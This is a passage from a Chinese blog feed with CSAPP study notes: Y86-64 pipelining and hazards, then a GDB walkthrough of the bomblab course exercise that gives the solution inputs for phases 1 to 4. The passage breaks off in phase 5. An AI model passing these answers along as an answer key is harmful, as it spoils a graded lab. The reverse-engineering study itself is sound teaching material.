指令，<code>aluB</code> 的值等于从寄存器<code>rB</code>中读取的<code>valB</code>。</li><li>对于 <code>rrmovq</code> 和 <code>irmovq</code> 指令，<code>aluB</code> 的值为0，因为这些指令只是数据传送，所以 <code>aluB</code> 为0。</li></ul><p>观察 ALU 在执行阶段执行的操作，可以看到它通常作为加法器来使用。不过，对于 oPq 指令，我们希望它使用指令 ifun 字段中编码的操作实现其他运算。</p><p>我们有一个信号 ALUfun 来控制 ALU进行什么操作，所以我们这样描述 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word alufun = [<br>icode == IOPQ : ifun;<br>//只在执行 OPq 指令的时候根据 func 功能位去选择运算种类<br>1 : ALUADD;<br>]<br></code></pre></td></tr></table></figure><p>当执行 OPq指令时，我们希望设置条件码，对此也有一个信号来控制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hcl">bool set_cc = icode in &#123;IOPQ&#125;;<br></code></pre></td></tr></table></figure><h4 id="访存"><a href="#访存" class="headerlink" title="访存"></a>访存</h4><p>访存阶段的任务就是读或者写程序数据。两个控制块产生内存地址和内存输入数据（为写操作）的值。另外两个块产生表明应该执行读操作还是写操作的控制信号。当执行读操作时， 数据内存产生值 valM。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AE%BF%E5%AD%98.png"></p><h4 id="更新-PC"><a href="#更新-PC" class="headerlink" title="更新 PC"></a>更新 PC</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%9B%B4%E6%96%B0PC.png"></p><p>SEQ的最后阶段会更新程序计数器的值，根据指令类型和是否要选择分支，新的PC可能是 valC、valM 或 calP。</p><h1 id="流水线的通用原理"><a href="#流水线的通用原理" class="headerlink" title="流水线的通用原理"></a>流水线的通用原理</h1><p>SQE 的缺点是要在一个周期内完成所有的操作，必须把时钟周期定的很慢，这样不能充分利用我们的硬件单元。为了解决这个问题，我们引入流水线来或获得更好的性能。</p><p>所谓流水线就是我们所熟知的工厂流水线、自动洗车机这种“流水线化”的系统。在流水线系统中，待执行的任务被划分成了若干个独立的部分，而这些部分是同时进行的。就像汽车加工厂拧螺丝的机器一直在拧螺丝，而不是等一辆车制作完成后再拧下一颗螺丝。</p><h3 id="计算流水线"><a href="#计算流水线" class="headerlink" title="计算流水线"></a>计算流水线</h3><p>下图是一个非流水线化的硬件系统的例子</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9D%9E%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>由一些执行计算的逻辑以及一个保存结果的寄存器组成，时钟信号会在每个特定的时间间隔去保存寄存器。</p><p>图中的计算块是用组合逻辑来实现的，意味着信号会穿过一系列逻辑门，在一定时间的延迟之后，输出就成为了输入的某个函数。</p><p>下图又是一张流水线化的系统</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>我们将两个系统对比来看，我们假设连个系统运行同一个程序，运算逻辑需要300ps，加载寄存器需要 20ps，那么非流水线化的指令周期就是 320ps。我们将运算分为3个部分，每个阶段需要100ps。然后在各个阶段之间放上流水线寄存器，这样每条指令都会按照这三步经过这个系统，从头到尾完成一次就需要三个完整的时钟周期。</p><blockquote><p>ps（皮秒，10e-12S） 是时间单位</p><p>吞吐量以十亿条指令 &#x2F;S（GIPS）作为单位，在上面的例子中，这个系统的吞吐量就是 1&#x2F;(320×10^12)</p></blockquote><p>这样就可以让三个阶段同时在工作，增加效率，但是执行单条指令所需时间增加。例如同样是这个计算逻辑，我们执行三次，非流水线化的程序需要三个完整的周期 960ps ，而流水线化的程序只需要 600ps （只是用于举例的计算，并不是实际过程中实现需要的时间）</p><h3 id="流水线操作的详细说明"><a href="#流水线操作的详细说明" class="headerlink" title="流水线操作的详细说明"></a>流水线操作的详细说明</h3><p>就像上面的流水线化的程序，把指令分为三个阶段，同一时间可能就会有三条指令经过不同的阶段，比如 240-360。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%8C%BA%E5%88%86.png"></p><p>下面我们跟踪了相应的电路活动</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%97%B6%E9%92%9F%E5%91%A8%E6%9C%9F.png"></p><p>在时刻 240（点 1）时钟上升之前，指令 I1 和I2 已经完成了阶段 B 和 A ，阶段A中计算的指令 I2 的值已经到达第一个流水线寄存器的输入，但是该寄存器的状态和输出还保持为指令Il在阶段A中计算的值。在时钟上升后，这些指令开始传送到阶段 C 和 B，而指令 I3 开始经过阶段 A（点 2 和 3）。就像图中点 3 处的曲线化的波阵面（curved wavefront）表明的那样，信号可能以不同的速率通过各个不同的部分。在时刻 360 之前，结果值到达流水线寄存器的输入（点4）。当时刻 360 时钟上升时，各条指令会前进经过一个流水线阶段。</p><p>从这个对流水线操作详细的描述中，我们可以看到减缓时钟不会影响流水线的行为。信号传播到流水线寄存器的输入，但是直到时钟上升时才会改变寄存器的状态。另一方面，如果时钟运行得太快，就会有灾难性的后果。值可能会来不及通过组合逻辑，因此当时钟上升时，寄存器的输人还不是合法的值。</p><h3 id="流水线的局限性"><a href="#流水线的局限性" class="headerlink" title="流水线的局限性"></a>流水线的局限性</h3><p>在我们理想的流水线化系统中，各部分相互独立，每个部分所需的时间都是相同，但实际情况中会有一些因素来降低流水线的效率。</p><h4 id="不一致的划分"><a href="#不一致的划分" class="headerlink" title="不一致的划分"></a>不一致的划分</h4><p>每一阶段的时间不是正好相同，就是降低效率的原因之一。比如下方程序被分为三个不同的阶段，但通过这些阶段的延迟从 50ps 到 150ps 不等。通过所有阶段的延迟和仍然为300ps。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E5%88%92%E5%88%86.png"></p><p>不过，运行时钟的速率是由最慢的阶段的延迟限制的。流水线图表明，每个时钟周期，阶段A都会空闲（用白色方框表示）100ps，而阶段C会空闲 50ps 。只有阶段B会一直处于活动状态。我们必须将时钟周期设为150+20&#x3D;170ps，得到吞吐量为5.88GIPS。另外，由于时钟周期减慢，延迟增加到了 510ps。</p><p>需要注意的是，对硬件设计者来说，将指令过程进行等分是很困难的。通常，处理器中的某些硬件单元，如ALU和内存，是不能被划分成多个延迟较小的单元的。这就使得创建一组平衡的阶段非常困难</p><h4 id="流水线过深，收益反而下降"><a href="#流水线过深，收益反而下降" class="headerlink" title="流水线过深，收益反而下降"></a>流水线过深，收益反而下降</h4><p>我们在这里划分了 50ps 一个阶段，那么我们所需最小时钟周期为 70ps，比起划分为 100ps 一个阶段，性能提高了 120&#x2F;70&#x3D;1.71 倍的效率，虽然我们将划分的<strong>阶段时长减小到了二分之一，但是效率确没有提高 2 倍</strong>，主要是流水线寄存器产生的延迟。如图这种情况，流水线寄存器的延迟占到了 28.6%。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%BB%B6%E8%BF%9F.png"></p><p>许多现代的处理器都采用了很深的流水线（15 或者更多），它们把一条指令的执行分成很多简单的步骤，这样一来，每个阶段的延迟就很小。</p><h3 id="待反馈的流水线系统"><a href="#待反馈的流水线系统" class="headerlink" title="待反馈的流水线系统"></a>待反馈的流水线系统</h3><p>在实际的系统中，我们的每一个指令都不是完全独立的，比如： <code>irmovq $50,%rax; addq %rax,%rbx</code> 这两句代码之间的 rax 就在传递。</p><p>如果只是采用最普通的流水线就会发生异常，在第一条指令的执行阶段，可能第二条指令正在译码，需要去等待第一条指令 %rax 的最终结果，直到第一条指令写回才更新 %rax 寄存器，此时第二条指令已经过了执行阶段了。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%A6%E5%8F%8D%E9%A6%88%E7%9A%84%E6%B5%81%E6%B0%B4%E7%BA%BF.png"></p><p>此时我们引入带反馈的流水线，带需要注意，由于流水线改变了系统的行为，我们必须正确处理反馈的影响。</p><p>像上图那样改变系统的行为是不可接受的。我们必须以某种方式来处理指令间的数据和控制相关，以使得到的行为与 ISA 定义的模型相符。</p><h1 id="Y86-64-的流水线实现"><a href="#Y86-64-的流水线实现" class="headerlink" title="Y86-64 的流水线实现"></a>Y86-64 的流水线实现</h1><p>首先，对顺序的SEQ处理器做一点小的改动，将PC的计算挪到取指阶段。然后，在各个阶段之间加上流水线寄存器。在此基础上做一些修改，就能实现我们的目标——一个高效的、流水线化的实现 Y86-64 ISA 的处理器。</p><h3 id="SEQ-：重新安排计算阶段"><a href="#SEQ-：重新安排计算阶段" class="headerlink" title="SEQ+：重新安排计算阶段"></a>SEQ+：重新安排计算阶段</h3><p>我们要调整一下 AEQ 中五个阶段的顺序，使更新 PC 阶段在一个时钟周期开始时进行，从而计算当前指令的 PC 值，而不是结束时执行。 调整后的设计称为 SQE+。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+PC.png"></p><p>我们创建<strong>状态寄存器</strong>来保存在一条指令执行过程中计算出来的信号，这种改进称为电路重定时（circuit retiming）。重定时改变了一个系统的状态表示，但是并不改变它的逻辑行为。通常用它来平衡一个流水线系统中各个阶段之间的延迟。</p><blockquote><p>SEQ+不会有硬件寄存器来存放 PC，而是根据前一条指令保存下来的一些状态信息动态地计算 PC</p></blockquote><h3 id="插入流水线寄存器"><a href="#插入流水线寄存器" class="headerlink" title="插入流水线寄存器"></a>插入流水线寄存器</h3><p>如下图为 SEQ+ 的硬件结构，我们要在此基础上插入流水线寄存器：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+%E7%A1%AC%E4%BB%B6.png"></p><p>我们插入流水线寄存器后得到 PIPE- 架构，其中灰色底色的框框内就是流水线寄存器：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ-%E7%A1%AC%E4%BB%B6.png"></p><p>流水线寄存器按如下方式标号：</p><ul><li>F（Fetch Code）保存程序计数器的预测值。</li><li>D（Decode）位于取指和译码阶段之间。它保存关于最新取出的指令的信息，即将由译码阶段进行处理。</li><li>E（Execute）位于译码和执行阶段之间。它保存关于最新译码的指令和从寄存器文件读出的值的信息，即将由执行阶段进行处理。</li><li>M（Memory Access）位于执行和访存阶段之间。它保存最新执行的指令的结果，即将由访存阶段进行处理。它还保存关于用于处理条件转移的分支条件和分支目标的信息。</li><li>W（Write Back）位于访存阶段和反馈路径之间，反馈路径将计算出来的值提供给寄存器文件写，而当完成ret指令时，它还要向PC选择逻辑提供返回地址。</li></ul><p>下面的代码就解释了流水线的步骤。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%AF%84%E5%AD%98%E5%99%A8%E6%B5%81%E7%A8%8B.png"></p><h3 id="对型号进行重新排列和标号"><a href="#对型号进行重新排列和标号" class="headerlink" title="对型号进行重新排列和标号"></a>对型号进行重新排列和标号</h3><p>顺序实现 SEQ 和 SEQ+ 在一个时刻只处理一条指令，因此诸如 valc、srcA 和 valE 这样的信号值有唯一的值。但在流水线化的设计中，与各个指令相关联的这些值有多个版本，会随着指令一起流过系统。</p><p>例如，在 PIPE- 的详细结构中，有4 个标号为 “Stat” 的白色方框，保存着 4 条不同指令的状态码。我们需要很小心以确保使用的是正确版本的信号。我们采用的命名机制，是<strong>在信号名前面加上大写的流水线寄存名字作为前缀</strong>，存储在流水线寄存器中的信号就可以被唯一地标识。</p><blockquote><p>在命名系统中,</p><p>大写的前缀 “D”、”E”、”M” 和 “W” 指的流水线寄存器，所以 M_stat 指的是流水线寄存器 M的状态码字段。</p><p>小写的前缀” f”、”d”、”e”、”m” 和 “w” 指的是流水线阶段，所以 m_stat 指的是在访存阶段中由控制逻辑块产生出的状态信号。</p></blockquote><p>PIPE- 中有一个块在相同表示形式的 SEQ+ 中是没有的，那就是译码阶段中标号为 <code>SelectA</code> 的块。我们可以看出，这个块会从来自流水线寄存器 D 的 valP 或从寄存器文件 A 端口中读出的值中选择一个，作为流水线寄存器 E的值 valA 。</p><p>这个块是为了减少要携带给流水线寄存器 E 和 M 的状态数量。在所有的指令中，只有 call 在访存阶段需要 valP 的值（压入下一个PC）。只有跳转指令在执行阶段（当不需要进行跳转时）需要 valP 的值。而这些指令又都不需要从寄存器文件中读出的值。</p><p>因此我们合并这两个信号，将它们作为信号 valA 携带穿过流水线，从而可以减少流水线寄存器的状态数量。这样做就消除了 SEQ（图4-23）和SEQ+（图4-40）中标号为 Data 的块，这个块完成的是类似的功能。</p><h3 id="预测下一个PC"><a href="#预测下一个PC" class="headerlink" title="预测下一个PC"></a>预测下一个PC</h3><p>流水线化设计的目的就是每个时钟周期都发射一条新指令，也就是说每个时钟周期都有一条新指令进入执行阶段并最终完成。要达到这个目的吞吐量必须要是是每个时钟周期一条指令。要做到这一点，我们必须在取出当前指令之后，马上确定下一条指令的位置。</p><p>如果取出的指令是条件分支指令，要到指令通过执行阶段之后，我们才能知道是否要选择分支。类似地，如果取出的指令是 ret，要到指令通过访存阶段，才能确定返回地址。</p><p>但是除此之外，我们都能在取指阶段结束后马上知道下一跳指令的地址，<strong>对于无条件跳转来说，下一条指令的地址是指令中的一个常数 valC，对于其他指令来说就是 valP。对于条件跳转指令来说，如果选择了跳转，那么 PC 新的值应当是 valC，如果选择不跳转，那么 PC 新的值应当是 valP。</strong></p><h3 id="流水线冒险"><a href="#流水线冒险" class="headerlink" title="流水线冒险"></a>流水线冒险</h3><p>我们需要在流水线中引入反馈系统，因为当相邻指令有关联的时候，前一条指令并不能和后一条指令并行执行。这个关联有两种形式</p><ul><li>数据相关：后一条指令需要读取前一条指令执行的结果</li><li>控制相关：后一条指令为条件跳转，条件取决于当前语句的执行状态。</li></ul><p>这些相关有可能会导致指令执行得到错误的结果，称为冒险。</p><p>同相关一样，冒险也可以被分为两部分：数据冒险和控制冒险，我们先考虑数据冒险。</p><h4 id="用暂停来避免数据冒险"><a href="#用暂停来避免数据冒险" class="headerlink" title="用暂停来避免数据冒险"></a>用暂停来避免数据冒险</h4><p>暂停 (stalling) 是避免冒险的一种常用技术，暂停时，处理器会停止流水线中一条或多条指令，直到冒险条件不再满足。让一条指令停顿在译码阶段，直到产生它的源操作数的指令通过了写回阶段，这样我们的处理器就能避免数据冒险。</p><h4 id="用转发来避免数据冒险"><a href="#用转发来避免数据冒险" class="headerlink" title="用转发来避免数据冒险"></a>用转发来避免数据冒险</h4><p>PIPE- 的设计是在译码阶段从寄存器文件中读人源操作数，但是对这些源寄存器的写有可能要在写回阶段才能进行。与其暂停直到写完成，不如简单地将要写的值传到流水线寄存器 E 作为源操作数。</p><p>这种将结果值直接从一个流水线阶段传到较早阶段的技术称为数据转发(data forwarding，或简称转发，有时称为旁路 bypassing)。数据转发需要在基本的硬件结构中增加一些额外的数据连接和控制逻辑。</p><h4 id="加载-x2F-使用数据冒险"><a href="#加载-x2F-使用数据冒险" class="headerlink" title="加载&#x2F;使用数据冒险"></a>加载&#x2F;使用数据冒险</h4><p>有一类数据冒险不能单纯用转发来解决，因为内存读在流水线发生的比较晚。</p><p>我们可以使用暂停+转发两种思想结合的方式解决冒险，如果发现访存得到的结果需要在下一条指令马上被访问，那么我就暂停一个指令周期等到访存结束之后马上转发给下一条指令，此时下一条指令正在译码阶段。这种方法叫做加载互锁。</p><h4 id="避免控制冒险"><a href="#避免控制冒险" class="headerlink" title="避免控制冒险"></a>避免控制冒险</h4><p>当处理器无法根据处于取指阶段的当前指令来确定下一条指令的地址时，就会出现控制冒险。我们的流水线化处理器中，控制冒险只会发生在ret 指令和跳转指令。</p><p>在出现特殊情况时，暂停和往流水线中插人气泡的技术可以动态调整流水线的流程。</p><hr><p>原来已经 20 多天了都没看完这一章，看的头昏脑胀😶‍🌫️</p><p>先这样，真的看不动了，大概扫了一下接下来的几个小节内容和之前大差不差且看不懂</p><p>最近 <del>sxx</del> 布置的作业好多感觉阳气都被她吸干了，我是懒惰虫😿</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章 bomblab</title>
    <link href="/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/"/>
    <url>/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/</url>
    
    <content type="html"><![CDATA[<p>在”拆弹“过程中结合 GDB 调试，分析理解掌握各种指令和数据结构的汇编代码表示</p><span id="more"></span><p>实验给到一个可执行程序和一个C语言的源码，但是源码的函数没有给全，只能判断大致逻辑。</p><p>设置了六个关卡需要全部通过之后才算成功，只要有一个关卡失败就会退出</p><hr><p>先看了一眼.c文件的源码，文件中有大致如下几个函数 ：<code>initialize_bomb()</code> 、<code>read_line()</code> 、<code>explode bomb()</code>、 <code>phase_[number]()</code> 、<code>phase_defuse</code>。</p><p>其中 explode 用来引爆炸弹结束进程，defuse 拆弹<del>（这两个还有那个初始化炸弹都不太重要）</del>，phase 系列函数就是具体每一个关卡对应的函数，每次新关卡都是 <code>read_line()</code> 先接受用户输入再进行判断的。</p><blockquote><p>之前机器里装了 pwndbg 用来调试，我觉得比光秃秃的 gdb 更好用🤪所以我这次还是用它啦</p></blockquote><p>直接 <code>gdb bomb</code> 调试看看，命令 <code>b main</code> 在 main 下断点然后 <code>n</code> 步入到第一个关卡函数。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_line.png"></p><p>程序在 <code>read line()</code> 这里停止，接收用户输入。由于关卡在输入之后，所以先输入一些乱码跳过这个函数进入下面的 <code>phase_1</code> 。</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>使用 <code>s</code> 命令进入到函数内部，发现 <code>call  strings_not_equal</code> 指令，根据字面意思也可以知道这是比较两个字符串。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-strings_not_equal.png"></p><p>此时 <em>rdi</em> 存储我们刚刚输入的内容，<em>rsi</em> 存储程序将要进行比较判断的内容，也是我们应该输入的正确答案：</p><p> <strong>Border relations with Canada have never been better.</strong>  </p><p>我们这条命令执行完毕后发现返回值是 0x1 也就是 1，后面有一个 <code>test eax,eax</code> 指令跟随零跳转，也就是说只有比较<strong>两个字符串相等</strong>才会继续执行程序，如果返回值为 1就会调用 <code>explode_bomb</code> 函数结束程序。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>进入下一个关卡，还是同样先输入再判断。先填充一些字符串进去再进入函数中调试观察。</p><p>进入 phase_2 后看到一个 read_six_number 函数，顾名思义就是读取六个数字。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_six_number.png"></p><p>这里发现读取的数字是从我们开始 <code>read_line()</code> 中输入的字符串截取的，  之后 <code>cmp  dword ptr [rsp], 1</code> 指令会将栈指针 rsp 的值和 1 比较。其中 dword ptr 代表要比较的数据在内存中占据4个字节，也就是我们<strong>输入的第一个数字要是 1</strong> 。</p><p>这样之后就会跳转到 <code>phase_2+52</code> 的地方去，我们发现它是一个循环</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-six_number_je.png"></p><p>其中循环中的判断内容是取当前 rbx-4 的值也就是判断的上一个数字的值赋值给 eax， 执行 <code>add eax, eax</code> 将值乘 2 再与当前要判断的数字比较。</p><p>总的来看是第一个数字是 1 ，之后的每一个数字都是前面的数字乘 2 。所以在这个关卡应该输入 <strong>1 2 4 8 16 32</strong> 。</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>进入到函数中发现有一个 <code>scanf()</code> 函数输出的格式化字符串是两个 <code>%d</code>，也就是我们在第三关要输入两个整数</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-scanf.png"></p><p>其中返回值 <code>eax</code> 表示正确格式化的数据个数，这里的判断要求返回值要大于 1 。</p><p>随后我们进入到 <code>phase_3+39</code> ，这里进的操作 <code>cmp   dword ptr [rsp+8], 7; ja    phase_3+106</code> ，目标操作数大于 7 才会进行跳转，跳转过去发现是 <code>explode_bomb()</code> 😅。</p><p>我们调试看这个 <code>[rsp+8]</code> 存储的信息就是我们输入的第一个参数，也就是说我们<strong>输入的第一个数要是整数且要小于等于 7</strong>。</p><p>下面就进入了一个跳转表</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct.png"></p><p>我们查看跳转表储存的信息</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_array.png"></p><p>这里也可以看出来输入的第一个值不能大于7 的原因，它还要用来匹配跳转表对应从0开始到7的索引值。</p><p>第一个 <code>0x400f7c</code> 就是 <code>phase_3+57</code> 的地址，我就直接用它，对应我们输入的第一个数字是 0。</p><p>这里的指令对应将 0xcf 也就是 207 赋值给 eax，随后将我们输入的第二个数字和 eax 比较，只有相等才能避开 <code>explode_bomb()</code></p><blockquote><p>看了看其他的选项都是给 eax 赋值再比较，原理是一样的</p></blockquote><p>所以说，综上我们知道第三次输入应该输入两个整数，我输入的是 <strong>0 207</strong></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>4和3是一样的套路，要求输入两个整数</p><p>不过这次的第一个数要求小于等于 0xe 也就是 14 才能跳转</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-jbe_0xe.png"></p><p>随后我们进入 func4 ，在此之前可以发现其中的四个参数分别由前面的指令赋值：edx &#x3D; 0xe&#x3D;14 、 esi &#x3D; 0 、 edi &#x3D; 我们输入的第一个数字</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-mov.png"></p><p>进入 func4  ,太长了直接 <code>disass func4 </code> 看这个函数完整的汇编代码</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-fun4.png"></p><p>很明显就发现发现它 call 了很多次 func4 也就是说这个是个递归函数，人工反编译一下大概就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(x,y,z)</span>      <span class="hljs-comment">//第一次递归中，x=我们输入的第一个数，y=0,z=14</span><br>&#123;    <br>    <span class="hljs-type">int</span> arg=z;<br>    arg-=y;<br>    <span class="hljs-type">int</span> val=arg;<br>    val&gt;&gt;=<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        z=val<span class="hljs-number">-1</span>;<br>        func4(x,y,z);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            y+=<span class="hljs-number">1</span>;<br>            func4(x,y,z);<br>            arg=arg+arg+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>整理简化一下，让它长得更像我们平时接触到的递归，大概就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> z)</span><br>&#123;<br>    <span class="hljs-type">int</span> arg=z-y;<br>    <span class="hljs-type">int</span> val=arg&gt;&gt;<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        arg=func4(x,y,val<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            arg=func4(x,y+<span class="hljs-number">1</span>,z);<br>            arg=arg*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据函数外 <code>phase_4+65</code> 处的判断，如果函数返回值为非 0 就会引爆炸弹，也就是说我们要让这个递归函数的最终返回值为0。写个测试代码运行一下发现 0、1、3 、7 都可以。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase4_return.png"></p><p>在返回值的检验后还有一个对 <code>rsp+0xc</code> 的检验，也就是我们输入的第二个值也要为0。</p><p>所以第四处应该输入两个数字，<strong>第一个是 0、1、3、7 任选其一，第二个是0</strong>。</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>还是输入 aaaaaaaaa 进入到第五个关卡，有一个 <code>string_lenth()</code> 函数</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-stringlenth.png"></p><p>函数下方紧跟的指令 <code>cmp eax, 6</code> 判断函数的返回值必须是 6，也就是说我们要输入六个字符</p><p>往下看成功跳转后的代码，里面还设置了一个 canary 保护，应该是检验上面的 6 长度字符的。代码依旧是很长我们直接看汇编代码</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase_5.png"></p><blockquote><p>箭头所指就是我们完成输入长度判断跳转后，关卡设置代码开始的地方</p></blockquote><p>先看 explode_bomb 前面用来判断的指令，有一个和 phase_1 一样的 <code>string_not_equal()</code> 函数，比较的文本是 flyers。也就是说我们输入的这个字符串最后的结果要是 “<strong>flyers</strong>“ ，但前面有那么多指令一定不是只输入一个 flyers 这么简单！</p><p>让我们来看一下：</p><p>在 +41 和 +74 之间有一个循环的部分，这个循环一定就是对字符串的处理了，同时，可以看出结束循环的标志是 <code>rax=6</code> 